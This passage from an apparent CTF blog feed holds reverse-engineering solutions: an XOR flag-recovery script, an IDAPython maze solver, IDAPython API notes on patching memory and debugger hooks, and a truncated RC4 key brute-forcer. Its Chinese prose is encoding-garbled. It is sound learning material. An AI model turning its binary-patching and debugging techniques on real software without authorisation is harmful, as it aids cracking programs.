)</span><br></pre></td></tr></table></figure><p>æ˜¯memcmpä¸¤ä¸ªå€¼ï¼ˆwmctfé‡Œé¢x64æ‰“å¼€soå°±æ˜¯è¿™ä¸ªï¼Œåœ¨armæ¶æ„ç­‰ä»·çš„å°±æ˜¯memcmpï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># lsat = [0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54, 0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, 0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57]</span></span><br><span class="line"><span class="comment"># j = 1</span></span><br><span class="line"><span class="comment"># a = [0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, 0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57]</span></span><br><span class="line"><span class="comment"># b = [0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54]</span></span><br><span class="line"><span class="comment"># c = b+a</span></span><br><span class="line"><span class="comment"># d = [0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, 0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57, 0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, 0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57, 0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54, 0x55, 0x03, 0x53, 0x57, 0x01, 0x03, 0x07, 0x04, 0x4A, 0x77, 0x0D,0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54]</span></span><br><span class="line"><span class="comment"># for i in range(len(d)-2,0,-1):</span></span><br><span class="line"><span class="comment">#     d[i] ^= d[(i+1)]</span></span><br><span class="line"><span class="comment"># pl(d)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l2 = [<span class="number">0x00</span>, <span class="number">0x1B</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x54</span>, <span class="number">0x4E</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x4B</span>, <span class="number">0x4F</span>, <span class="number">0x57</span>, <span class="number">0x05</span>, <span class="number">0x54</span>]</span><br><span class="line">l1 = [<span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x5F</span>, <span class="number">0x0D</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, <span class="number">0x14</span>, <span class="number">0x49</span>, <span class="number">0x05</span>, <span class="number">0x57</span>]</span><br><span class="line">l = l1+l2</span><br><span class="line"><span class="comment"># m = [0x0A, 0x0D, 0x06, 0x1C, 0x1A, 0x0E, 0x04, 0x18, 0x06, 0x10, 0x0B, 0x0A, 0x0D, 0x0A, 0x09, 0x12, 0x0D, 0x0F, 0x0A, 0x01, 0x1D, 0x1B, 0x1A, 0x08, 0x0C, 0x1B, 0x07, 0x0C, 0x0D, 0x1C, 0x59, 0x01, 0x02, 0x0B, 0x0A, 0x0B, 0x0C, 0x03, 0x02, 0x03, 0x4B, 0x77, 0x0D]</span></span><br><span class="line"><span class="comment"># j = 0</span></span><br><span class="line"><span class="comment"># for i in range(len(l)-1,-1,-1):</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pl(l)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(ord(&#x27;&#125;&#x27;)^0x77)</span></span><br><span class="line"><span class="comment"># print(chr(ord(&#x27;K&#x27;)^0x7D))</span></span><br><span class="line">k = [<span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x5F</span>, <span class="number">0x0D</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, <span class="number">0x14</span>, <span class="number">0x49</span>, <span class="number">0x05</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x1B</span>, <span class="number">0x19</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x54</span>, <span class="number">0x4E</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x4B</span>, <span class="number">0x4F</span>, <span class="number">0x57</span>, <span class="number">0x05</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x03</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x4A</span>, <span class="number">0x77</span>]</span><br><span class="line">kk = k</span><br><span class="line">kb = kk[:]</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">    kk[<span class="built_in">len</span>(kk)-<span class="number">1</span>] = ch</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(kk)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        kk[i] ^= kk[i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> kk[<span class="number">0</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>) <span class="keyword">and</span> kk[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>):</span><br><span class="line">        pl(kk)</span><br><span class="line">    kk = kb[:]</span><br></pre></td></tr></table></figure><h3 id="tmaze">tmaze</h3><p>æ ¹æ®è°ƒè¯•åˆ†æå¯ä»¥çŸ¥é“å®ƒæ˜¯ä¸€ä¸ªé“¾è¡¨(?å›¾)ï¼Œæœ‰ä¸‰ä¸ªæ–¹å‘å’Œ3ä¸ªæ ‡è®°ã€‚è¦èµ°åˆ°æœ€åä¸€ä¸ªv7çš„ä½ç½®</p><p>nodeèŠ‚ç‚¹å¤§æ¦‚æ˜¯</p><p><img src="https://s2.loli.net/2024/09/08/Cq5yrtOnwTAXvsY.png" alt="image-20240908215707302"></p><p>å‰ä¸‰ä¸ªæ˜¯æŒ‡é’ˆï¼Œåé¢çš„signæ˜¯ä¸‰ä¸ªæ–¹å‘æ˜¯å¦å¯ä»¥é€šè¿‡çš„æ ‡è®°</p><p>befæŒ‡å‘å‰ä¸€ä¸ªnode<br>nextæŒ‡å‘ä¸‹ä¸€ä¸ªnode<br>trideçš„æŒ‡å‘æ²¡æœ‰çœ‹æ‡‚ï¼Œä½†æ˜¯è¿™ä¸ªæŒ‡é’ˆæ˜¯äº’æŒ‡çš„</p><p><img src="https://s2.loli.net/2024/09/08/H1NhxZkWCRIsJ72.png" alt="image-20240908215931928"></p><p>åˆå§‹åŒ–è¿‡ç¨‹</p><p><img src="https://s2.loli.net/2024/09/08/O5GbkeMc2RqNS37.png" alt="image-20240908215956884"></p><p>æ£€æŸ¥è¾“å…¥è¿‡ç¨‹</p><p>è¿™ä¸ªé¢˜å½“æ—¶è¢«å›°åœ¨ä¸ä¼šå†™idcè„šæœ¬ï¼Œæœ€åå­¦é•¿å‘Šè¯‰æˆ‘idapythonæ›´æ–¹ä¾¿ï¼Œç„¶åå°±è¯•äº†ä¸€ä¸‹idapythonå‘ç°è¿™ä¸ªè¯­æ³•å’ŒpythonåŸºæœ¬ä¸€æ ·ï¼Œæ„Ÿè§‰å¾ˆçˆ½ï¼Œç„¶åå°±æŠŠè„šæœ¬æ“å‡ºæ¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, addr: <span class="built_in">int</span></span>):</span><br><span class="line">        self.addr = addr</span><br><span class="line">        self.x = <span class="built_in">int</span>(idc.get_qword(addr))</span><br><span class="line">        self.y = <span class="built_in">int</span>(idc.get_qword(addr + <span class="number">8</span>))</span><br><span class="line">        self.z = <span class="built_in">int</span>(idc.get_qword(addr + <span class="number">16</span>))</span><br><span class="line">        self.to_x = <span class="built_in">int</span>(idc.get_wide_byte(addr + <span class="number">24</span>)) == <span class="number">0</span></span><br><span class="line">        self.to_y = <span class="built_in">int</span>(idc.get_wide_byte(addr + <span class="number">25</span>)) == <span class="number">0</span></span><br><span class="line">        self.to_z = <span class="built_in">int</span>(idc.get_wide_byte(addr + <span class="number">26</span>)) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>(self.addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, Node):</span><br><span class="line">            <span class="keyword">return</span> self.addr == other.addr</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_next</span>(<span class="params">self, direction</span>):</span><br><span class="line">        <span class="keyword">if</span> direction == <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> self.to_x:</span><br><span class="line">            <span class="keyword">return</span> Node(self.x)</span><br><span class="line">        <span class="keyword">elif</span> direction == <span class="string">&#x27;y&#x27;</span> <span class="keyword">and</span> self.to_y:</span><br><span class="line">            <span class="keyword">return</span> Node(self.y)</span><br><span class="line">        <span class="keyword">elif</span> direction == <span class="string">&#x27;z&#x27;</span> <span class="keyword">and</span> self.to_z:</span><br><span class="line">            <span class="keyword">return</span> Node(self.z)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_way</span>(<span class="params">start, end, visited=<span class="literal">None</span>, path=<span class="string">&#x27;&#x27;</span>, path_length=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> visited <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        visited = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">if</span> path_length &gt; <span class="number">43</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    visited.add(start)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> start == end:</span><br><span class="line">        <span class="keyword">return</span> path, path_length</span><br><span class="line">    shortest_path = <span class="literal">None</span></span><br><span class="line">    shortest_length = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> situation <span class="keyword">in</span> <span class="string">&#x27;xyz&#x27;</span>:</span><br><span class="line">        next_node = start.get_next(situation)</span><br><span class="line">        <span class="keyword">if</span> next_node <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> next_node <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">            new_path, new_length = find_way(next_node, end, visited.copy(), path + situation, path_length + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> new_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> new_length &lt; shortest_length:</span><br><span class="line">                shortest_path = new_path</span><br><span class="line">                shortest_length = new_length</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> shortest_path, shortest_length</span><br><span class="line"></span><br><span class="line">start_node = Node(<span class="number">0x1B7BA6315D0</span>)</span><br><span class="line">end_node = Node(<span class="number">0x1B7BA632180</span>)</span><br><span class="line">path, plength = find_way(start_node, end_node)</span><br><span class="line"><span class="built_in">print</span>(path)</span><br><span class="line"><span class="comment"># yzyzyzyzyyzxzyyyzxzyzxxxzxzyyyyyyyyzxzxzyy</span></span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get<span class="emphasis">_qword è·å–å¯¹åº”åœ°å€çš„qwordå€¼</span></span><br><span class="line"><span class="emphasis">get_wide_</span>bytes è·å–å¯¹åº”åœ°å€çš„byteså€¼</span><br></pre></td></tr></table></figure><p>æ¯”èµ›çš„æ—¶å€™æ²¡å‡ºï¼Œä¸çŸ¥é“æœ€åæ˜¯ä¸æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;yzyzyzyzyyzxzyyyzxzyzxxxzxzyyyyyyyyzxzxzyy&#x27;</span></span><br><span class="line">uuid3_generated = uuid.uuid3(uuid.NAMESPACE_DNS, name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> å®‰å“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDApythonå¸¸è§æ¥å£</title>
      <link href="/posts/c52f1795.html"/>
      <url>/posts/c52f1795.html</url>
      
        <content type="html"><![CDATA[<p>IDAæ”¯æŒä¸¤ç§è„šæœ¬è¯­è¨€ï¼Œåˆ†åˆ«ä¸ºIDCå’ŒIDApythonã€‚</p><p>IDCå’ŒCè¯­è¨€æ„Ÿè§‰å·®åˆ«è¾ƒå¤§ï¼Œæ¯”å¦‚i++å¿…é¡»å†™æˆi = i + 1ï¼Œæ„Ÿè§‰ååˆ†éº»çƒ¦ï¼ŒåŒæ—¶è¿˜ä¿ç•™äº†èŠ±æ‹¬å·ï¼Œæœ‰ç‚¹ç¦»è°±ï¼Œè§£é‡Šè¯­è¨€è¿˜æœ‰ä¸€å †æ ¼å¼ï¼Œåˆæ”¹äº†ä¸€äº›ä¸œè¥¿ï¼Œå¤ªéš¾ç”¨äº†ã€‚äºæ˜¯æˆ‘å°è¯•å­¦ä¹ IDApythonã€‚<br>IDApyhonçš„å¥½å¤„åœ¨äºå®ƒçš„è¯­æ³•å’Œpythonä¸€æ¨¡ä¸€æ ·ï¼Œè€Œé€šè¿‡<code>import idc.idc</code>å°±å¯ä»¥ä½¿ç”¨æ‰€æœ‰IDCå¯ä»¥ä½¿ç”¨çš„IDAçš„æ¥å£ï¼Œå…¶å…·ä½“çš„æ¥å£å®šä¹‰åœ¨<code>IDAä¸»ç›®å½•\python\3</code>ç›®å½•ä¸­ï¼Œå°†å…¶æ·»åŠ åˆ°å·¥ç¨‹ç›®å½•ï¼Œç„¶åå°±å¯ä»¥å¼•ç”¨å…¶ä¸­çš„å†…å®¹äº†ï¼ˆåªçœ‹äº†8.3ç‰ˆæœ¬çš„ï¼‰</p><p>å…¶ä¸­çš„æ‰€æœ‰ä»£ç å‡éœ€è¦åœ¨idaå‘½ä»¤è¡Œæˆ–è€…è„šæœ¬ç•Œé¢æ‰§è¡Œ</p><p>å‚è€ƒï¼š</p><p><a href="https://github.com/yanxxd/IDA/blob/master/IDAPython%E6%89%8B%E5%86%8C%E4%B8%AD%E6%96%87%E7%89%88.pdf">IDA/IDAPythonæ‰‹å†Œä¸­æ–‡ç‰ˆ.pdf at master Â· yanxxd/IDA (github.com)</a></p><h3 id="å¯¹åœ°å€çš„è¯»å†™æ¥å£">å¯¹åœ°å€çš„è¯»å†™æ¥å£</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">get_wide_byte(addr)</span><br><span class="line">get_wide_word(addr)</span><br><span class="line">get_wide_dword(addr)</span><br><span class="line">get_qword(addr)</span><br><span class="line"><span class="comment"># ä¸Šé¢çš„åˆ†åˆ«è¯»å–ç›®æ ‡åœ°å€çš„1ï¼Œ2ï¼Œ3ï¼Œ4å­—èŠ‚ï¼Œè¿”å›å¯¹åº”çš„å€¼</span></span><br><span class="line">patch_byte(ea,x)</span><br><span class="line">patch_word(ea, x)</span><br><span class="line">patch_dword(ea, x)</span><br><span class="line">patch_qword(ea, x)</span><br><span class="line"><span class="comment"># ä¸Šé¢çš„åˆ†åˆ«ä¿®æ”¹å¯¹åº”eaçš„åœ°å€ä¸ºxçš„å€¼</span></span><br></pre></td></tr></table></figure><p>eaæ˜¯IDAä¸­çš„åœ°å€</p><p>å…¶å®ƒçš„ä¸åŒç²’åº¦çš„æ“ä½œå‚è€ƒä¸Šé¢çš„pdf</p><h3 id="è°ƒè¯•æ—¶è·å–å¯„å­˜å™¨çš„å€¼">è°ƒè¯•æ—¶è·å–å¯„å­˜å™¨çš„å€¼</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyDbgHook</span>(idaapi.DBG_Hooks):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_bpt</span>(<span class="params">self, tid, ea</span>):</span><br><span class="line">        <span class="keyword">if</span> ea == <span class="number">0x4015c1</span>:</span><br><span class="line">            rdx = idc.get_reg_value(<span class="string">&quot;rdx&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;0x%x&quot;</span> % rdx)</span><br><span class="line">        <span class="comment"># Continue the execution</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Instantiate and hook the debugger</span></span><br><span class="line">debughook = MyDbgHook()</span><br><span class="line">debughook.hook()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add a breakpoint at 0x4015c1</span></span><br><span class="line">idaapi.add_bpt(<span class="number">0x4015c1</span>)</span><br></pre></td></tr></table></figure><p>é‡å†™dbg_bptæ–¹æ³•ï¼Œä½¿å¾—æ‰§è¡Œåˆ°å¯¹åº”åœ°å€çš„æ—¶å€™æ‰“å°å‡ºæ‰€æœ‰å€¼</p><p>æˆ–è€…ç›´æ¥åœ¨æ–­ç‚¹conditionçš„åœ°æ–¹å†™print(RAX)</p><p>contiditionå†™æ³•ï¼Œè¿™ç§å†™æ³•ä¸ä¼šä½¿æ–­ç‚¹å‘½ä¸­ï¼Œåªä¼šæ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rax = idc.get_reg_value(<span class="string">&quot;rax&quot;</span>)</span><br><span class="line">func_name = idc.get_func_name(rax)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;func_name&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="IDA-appcall">IDA appcall</h3><p><a href="https://docs.hex-rays.com/user-guide/debugger/debugger-tutorials/appcall_primer#variadic-functions">Appcall åº”ç”¨ç¨‹åºè°ƒç”¨ |Hex-Rays æ–‡æ¡£</a></p><p>é€šè¿‡CILæˆ–è„šæœ¬ç›´æ¥è°ƒç”¨ç¨‹åºå†…çš„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MessageBoxW(<span class="number">0</span>i64, <span class="string">L&quot;ests&quot;</span>, <span class="string">L&quot;hello&quot;</span>, <span class="number">1u</span>);</span><br><span class="line">sub_7FF64FBD1910(<span class="string">&quot;HEllo&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼äºå¦‚ä¸Šæ ¼å¼</p><p>åœ¨idapythonä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> Appcall</span><br><span class="line">Appcall.MessageBoxW(0i64, L<span class="string">&quot;ests&quot;</span>, L<span class="string">&quot;hello&quot;</span>, 1u);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> å·¥å…· </category>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> è¯­è¨€ </tag>
            
            <tag> ida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dasctf-reå¤ç°</title>
      <link href="/posts/9e273b7a.html"/>
      <url>/posts/9e273b7a.html</url>
      
        <content type="html"><![CDATA[<h2 id="wp">wp</h2><h3 id="pic">pic</h3><p>åŠ¨è°ƒå¯çŸ¥ï¼Œå°±æ˜¯ä¸€ä¸ªå¼‚æˆ–åŠ rc4ï¼Œéœ€è¦çˆ†ç ´5ä½çš„key</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;numeric&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">init_permutation</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; key)</span> </span>&#123;</span><br><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">S</span><span class="params">(<span class="number">256</span>)</span></span>;</span><br><span class="line">std::<span class="built_in">iota</span>(S.<span class="built_in">begin</span>(), S.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">j = (j + S[i] + key[i % key.<span class="built_in">size</span>()]) % <span class="number">256</span>;</span><br><span class="line">std::<span class="built_in">swap</span>(S[i], S[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> S;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; <span class="title">read_file</span><span class="params">(<span class="type">const</span> std::string&amp; filename)</span> </span>&#123;</span><br><span class="line"><span class="function">std::ifstream <span class="title">file</span><span class="params">(filename, std::ios::binary)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!file) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;æ— æ³•æ‰“å¼€æ–‡ä»¶ï¼&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; <span class="title">buffer</span><span class="params">((std::istreambuf_iterator&lt;<span class="type">char</span>&gt;(file)), std::istreambuf_iterator&lt;<span class="type">char</span>&gt;())</span></span>;</span><br><span class="line">file.<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">const</span> std::string filename = <span class="string">&quot;C:\\å·¥ä½œåŒº\\box\\ctf\\dasctf2024qiu\\re\\pic\\pic\\bak\\flag.png&quot;</span>;</span><br><span class="line"><span class="keyword">auto</span> buf = <span class="built_in">read_file</span>(filename);</span><br><span class="line"><span class="keyword">auto</span> bak = buf;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; onkey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> i1 = <span class="string">&#x27;0&#x27;</span>; i1 &lt;= <span class="string">&#x27;z&#x27;</span>; ++i1) &#123;</span><br><span class="line"><span class="keyword">if</span> (i1 &gt; <span class="string">&#x27;9&#x27;</span> &amp;&amp; i1 &lt; <span class="string">&#x27;a&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> i2 = <span 